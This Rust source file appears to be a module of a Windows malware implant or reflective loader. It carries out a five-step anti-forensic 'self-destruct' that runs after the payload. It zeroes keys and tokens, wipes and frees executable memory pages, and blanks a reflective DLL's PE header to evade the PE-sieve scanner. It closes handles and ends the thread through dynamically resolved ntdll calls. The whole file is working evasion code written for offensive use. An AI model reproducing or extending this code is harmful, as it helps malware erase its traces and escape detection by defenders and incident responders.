//! T-REX Self-Destruct Sequence — five-step zero-trace memory wipe.
//!
//! Step 1: SecureZero all sensitive buffers (keys, reports, tokens)
//! Step 2: WipeAndFree all allocated RX pages
//! Step 3: Zero PE header (anti PE-sieve)
//! Step 4: Close all tracked handles
//! Step 5: NtTerminateThread(NT_CURRENT_THREAD, 0) — never returns
//!
//! # References
//! - maldev Cleanup (2026): SecureZero + WipeAndFree + self-delete
//! - zero-loader (xAL6 2026): post-exec cleanup, VEH/DR/key wipe

#![cfg(target_os = "windows")]

use core::ffi::c_void;

const PAGE_READWRITE: u32 = 0x04;
const MEM_RELEASE: u32 = 0x8000;
const PAGE_SIZE: usize = 0x1000;

// ---- Type aliases ---------------------------------------------------------

type NtProtectFn =
    unsafe extern "system" fn(isize, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;

type NtFreeFn = unsafe extern "system" fn(isize, *mut *mut c_void, *mut usize, u32) -> i32;

type NtCloseFn = unsafe extern "system" fn(isize) -> i32;

type NtTerminateFn = unsafe extern "system" fn(isize, i32) -> i32;

// ---- Step 1: SecureZero ---------------------------------------------------

/// Zero a byte buffer with compiler fence to prevent optimization.
pub fn secure_zero(buf: &mut [u8]) {
    for byte in buf.iter_mut() {
        unsafe {
            core::ptr::write_volatile(byte, 0);
        }
    }
    core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);
}

/// Zero multiple mutable byte slices.
pub fn secure_zero_many(buffers: &mut [&mut [u8]]) {
    for buf in buffers.iter_mut() {
        secure_zero(buf);
    }
}

// ---- Step 2: WipeAndFree --------------------------------------------------

unsafe fn resolve_nt_protect() -> Option<NtProtectFn> {
    crate::resolve::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory")
        .map(|a| core::mem::transmute(a))
}

unsafe fn resolve_nt_free() -> Option<NtFreeFn> {
    crate::resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory")
        .map(|a| core::mem::transmute(a))
}

/// For each page: flip RX→RW, zero, free.
pub unsafe fn wipe_and_free_pages(pages: &[*mut c_void]) {
    let protect = match resolve_nt_protect() {
        Some(f) => f,
        None => return,
    };
    let free = match resolve_nt_free() {
        Some(f) => f,
        None => return,
    };
    let cur: isize = -1;

    for &page in pages {
        if page.is_null() {
            continue;
        }
        let mut old: u32 = 0;
        let mut base = page;
        let mut sz: usize = PAGE_SIZE;
        let st = protect(cur, &mut base, &mut sz, PAGE_READWRITE, &mut old);
        if st < 0 {
            continue;
        }
        core::ptr::write_bytes(page as *mut u8, 0, PAGE_SIZE);
        core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);
        let mut free_base = page;
        let mut free_sz: usize = 0;
        free(cur, &mut free_base, &mut free_sz, MEM_RELEASE);
    }
}

// ---- Step 3: ZeroPEHeader -------------------------------------------------

/// Zero the first 4 KiB of a reflective DLL's PE header (anti PE-sieve).
pub unsafe fn zero_pe_header(module_base: *mut u8) {
    let protect = match resolve_nt_protect() {
        Some(f) => f,
        None => return,
    };
    let cur: isize = -1;
    let mut old: u32 = 0;
    let mut base: *mut c_void = module_base as *mut c_void;
    let mut sz: usize = PAGE_SIZE;
    let st = protect(cur, &mut base, &mut sz, PAGE_READWRITE, &mut old);
    if st < 0 {
        return;
    }
    core::ptr::write_bytes(module_base, 0, PAGE_SIZE);
    core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);
}

// ---- Step 4: CloseAllHandles ----------------------------------------------

unsafe fn resolve_nt_close() -> Option<NtCloseFn> {
    crate::resolve::export_addr(b"ntdll.dll", b"NtClose").map(|a| core::mem::transmute(a))
}

/// Close all tracked NT handles. Skips pseudo-handles (-1, -2).
pub unsafe fn close_all_handles(handles: &[isize]) {
    let nt_close = match resolve_nt_close() {
        Some(f) => f,
        None => return,
    };
    for &h in handles {
        if h == -1 || h == -2 {
            continue;
        } // skip pseudo-handles
        nt_close(h);
    }
}

// ---- Step 5: NtTerminateThread --------------------------------------------

unsafe fn resolve_nt_terminate() -> Option<NtTerminateFn> {
    crate::resolve::export_addr(b"ntdll.dll", b"NtTerminateThread").map(|a| core::mem::transmute(a))
}

/// Terminate calling thread. NEVER returns.
pub unsafe fn terminate_self() -> ! {
    if let Some(f) = resolve_nt_terminate() {
        f(-2isize, 0); // NT_CURRENT_THREAD (-2), ExitStatus=0
    }
    // If resolution failed or NtTerminateThread returned, spin forever.
    loop {
        core::hint::spin_loop();
    }
}

// ---- Orchestrated Self-Destruct -------------------------------------------

/// Full five-step self-destruct. NEVER returns.
pub unsafe fn self_destruct(
    sensitive_buffers: &mut [&mut [u8]],
    rx_pages: &[*mut c_void],
    module_base: Option<*mut u8>,
    handles: &[isize],
) -> ! {
    secure_zero_many(sensitive_buffers);
    wipe_and_free_pages(rx_pages);
    if let Some(base) = module_base {
        zero_pe_header(base);
    }
    close_all_handles(handles);
    terminate_self()
}
